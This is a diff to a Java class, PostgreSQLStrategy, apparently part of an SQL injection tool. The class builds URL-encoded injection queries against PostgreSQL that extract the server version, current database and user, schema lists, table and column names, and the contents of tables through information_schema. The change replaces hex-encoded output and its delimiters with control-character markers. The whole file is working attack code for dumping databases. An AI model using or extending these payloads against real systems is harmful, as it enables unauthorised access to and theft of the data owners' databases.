@@ -13,41 +13,75 @@ public class PostgreSQLStrategy implements ISQLStrategy {
     @Override
     public String getSchemaInfos() {
         return 
-            "encode(" +
-                "concat_ws(" +
-                    "'{%}'," +
-                    "version()," +
-                    "current_database()," +
-                    "user," +
-                    "session_user" +
-                ")::bytea" +
-            ",'hex')" +
-            "||" +
-            "'i'";
+                "" +
+                    "concat_ws(" +
+                        "'{%}'," +
+                        "version()," +
+                        "current_database()," +
+                        "user," +
+                        "session_user" +
+                    ")" +
+                "" +
+                "||" +
+                "'%01%03%03%07'";
+//        return 
+//                "encode(" +
+//                    "concat_ws(" +
+//                        "'{%}'," +
+//                        "version()," +
+//                        "current_database()," +
+//                        "user," +
+//                        "session_user" +
+//                    ")::bytea" +
+//                ",'hex')" +
+//                "||" +
+//                "'i'";
+//        return "SELECT+version||'{%}'||SYS.DATABASE_NAME||'{%}'||user||'{%}'||user||'%01%03%03%07'FROM+v%24instance";
+
     }
 
     @Override
     public String getSchemaList() {
         return 
-            "select+array_to_string(array(" +
-                "select" +
-                    "'hh'||" +
-                    "r||" +
-                    "'jj'||" +
-                    "encode(q::text::bytea,'hex')||" +
-                    "'hh'" +
-                "from(" +
-                    "SELECT+" +
-                        "encode(tables.table_schema::bytea,'hex')r," +
-                        "count(table_name)q+" +
-                    "FROM+" +
-                        "information_schema.tables+" +
-                    "group+by+r+" +
-                    "order+by+r{limit}" +
-                ")x" +
-            "),'gg')" +
-            "||" +
-            "'i'";
+                "select+array_to_string(array(" +
+                    "select" +
+                        "'%04'||" +
+                        "r||" +
+                        "'%05'||" +
+                        "q::text||" +
+                        "'%04'" +
+                    "from(" +
+                        "SELECT+" +
+                            "tables.table_schema+r," +
+                            "count(table_name)q+" +
+                        "FROM+" +
+                            "information_schema.tables+" +
+                        "group+by+r+" +
+                        "order+by+r{limit}" +
+                    ")x" +
+                "),'%06')" +
+                "||" +
+                "'%01%03%03%07'";
+//        return 
+//                "select+array_to_string(array(" +
+//                    "select" +
+//                        "'hh'||" +
+//                        "r||" +
+//                        "'jj'||" +
+//                        "encode(q::text::bytea,'hex')||" +
+//                        "'hh'" +
+//                    "from(" +
+//                        "SELECT+" +
+//                            "encode(tables.table_schema::bytea,'hex')r," +
+//                            "count(table_name)q+" +
+//                        "FROM+" +
+//                            "information_schema.tables+" +
+//                        "group+by+r+" +
+//                        "order+by+r{limit}" +
+//                    ")x" +
+//                "),'gg')" +
+//                "||" +
+//                "'i'";
     }
 
     @Override
@@ -55,22 +89,22 @@ public class PostgreSQLStrategy implements ISQLStrategy {
         return
             "select+array_to_string(array(" +
                 "select" +
-                    "'hh'||" +
+                    "'%04'||" +
                     "r||" +
-                    "'jj'||" +
-                    "encode(q::text::bytea,'hex')||" +
-                    "'hh'" +
+                    "'%05'||" +
+                    "q::text||" +
+                    "'%04'" +
                 "from(" +
                     "SELECT+" +
-                        "encode(tables.table_name::bytea,'hex')r,'0'q+" +
+                        "tables.table_name+r,'0'q+" +
                     "FROM+" +
                         "information_schema.tables+" +
                     "where+tables.TABLE_SCHEMA='" + database.toString() + "'" +
                     "order+by+r{limit}" +
                 ")x" +
-            "),'gg')" +
+            "),'%06')" +
             "||" +
-            "'i'";
+            "'%01%03%03%07'";
     }
 
     @Override
@@ -78,23 +112,23 @@ public class PostgreSQLStrategy implements ISQLStrategy {
         return
             "select+array_to_string(array(" +
                 "select" +
-                    "'hh'||" +
+                    "'%04'||" +
                     "r||" +
-                    "'jj'||" +
-                    "encode(q::text::bytea,'hex')||" +
-                    "'hh'" +
+                    "'%05'||" +
+                    "q::text||" +
+                    "'%04'" +
                 "from(" +
                     "SELECT+" +
-                        "encode(columns.column_name::bytea,'hex')r,'0'q+" +
+                        "columns.column_name+r,'0'q+" +
                     "FROM+" +
                         "information_schema.columns+" +
                     "where+columns.TABLE_SCHEMA='" + table.getParent().toString() + "'" +
                     "and+columns.TABLE_name='" + table.toString() + "'" +
                     "order+by+r{limit}" +
                 ")x" +
-            "),'gg')" +
+            "),'%06')" +
             "||" +
-            "'i'";
+            "'%01%03%03%07'";
     }
 
     @Override
@@ -105,21 +139,21 @@ public class PostgreSQLStrategy implements ISQLStrategy {
         return
             "select+array_to_string(array(" +
                 "select" +
-                    "'hh'||" +
+                    "'%04'||" +
                     "r||" +
-                    "'jj'||" +
-                    "encode(q::text::bytea,'hex')||" +
-                    "'hh'" +
+                    "'%05'||" +
+                    "q::text||" +
+                    "'%04'" +
                 "from(" +
                     "SELECT+" +
-                        "encode(substr((" + formatListColumn + "),1,775)::bytea,'hex')r,count(*)q+" +
+                        "substr((" + formatListColumn + "),1,775)r,count(*)q+" +
                     "FROM+" +
                         "" + database + "." + table + "+" +
                     "group+by+r{limit}" +
                 ")x" +
-            "),'gg')" +
+            "),'%06')" +
             "||" +
-            "'i'";
+            "'%01%03%03%07'";
     }
 
     @Override
@@ -221,7 +255,7 @@ public class PostgreSQLStrategy implements ISQLStrategy {
                     "(" + sqlQuery + ")," +
                     startPosition + "," +
                     "65536" +
-                "),'i')";
+                "),'%01%03%03%07')";
     }
 
     @Override
